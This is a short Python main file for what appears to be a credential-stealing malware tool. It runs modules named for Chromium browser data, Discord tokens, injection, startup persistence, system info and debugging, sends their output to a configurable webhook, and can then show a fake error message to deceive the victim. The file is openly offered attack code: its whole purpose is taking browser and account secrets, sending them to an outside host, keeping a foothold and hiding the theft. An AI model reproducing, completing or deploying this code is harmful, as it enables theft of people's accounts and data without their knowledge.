from components.chromium import *
from components.debug import *
from components.disctoken import *
from components.exectime import *
from components.fakeerror import *
from components.injection import *
from components.startup import *
from components.sysinfo import *

from config import __CONFIG__

def main(webhook: str) -> None:
    _exec_time = exec_time()

    funcs = [
        debug,
        startup,
        injection,
        chromium,
        disctoken,
        sysinfo,
    ]

    for func in funcs:
        if __CONFIG__[func.__name__]:
            if type(func) == type:
                [func(webhook) if 'webhook' in func.__init__.__code__.co_varnames else func()]
            else:
                [func(webhook) if 'webhook' in func.__code__.co_varnames else func()]

    _exec_time.stop()
    _exec_time.send(webhook)

    if __CONFIG__['fakeerror']['use']:
        fake_error(__CONFIG__['fakeerror']['message'])

if __name__ == "__main__":
    main(__CONFIG__['webhook'])
